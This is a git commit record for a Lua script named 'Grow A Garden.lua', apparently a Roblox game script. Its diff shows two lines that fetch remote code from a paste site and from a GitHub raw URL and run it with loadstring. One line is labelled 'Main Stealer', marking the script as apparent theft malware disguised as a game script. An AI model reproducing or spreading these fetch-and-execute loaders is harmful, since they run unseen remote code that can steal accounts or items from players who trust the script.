1dab8b87ec87cbedbdf714bcb74c4a5e05dec767
SproutX-Scripter <aroaenix@gmail.com>
2025-07-19 13:18:20 +0800

    Update Grow A Garden.lua

--- Grow A Garden.lua
+++ Grow A Garden.lua
@@ -1,3 +1,4 @@
 - Main Stealer
 loadstring(game:HttpGet("https://cdn.sourceb.in/bins/WW0Z4ghVUe/0", true))()
 - Lua
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Renasaix/UI-EGGS/refs/heads/main/Test%20101.lua"))()
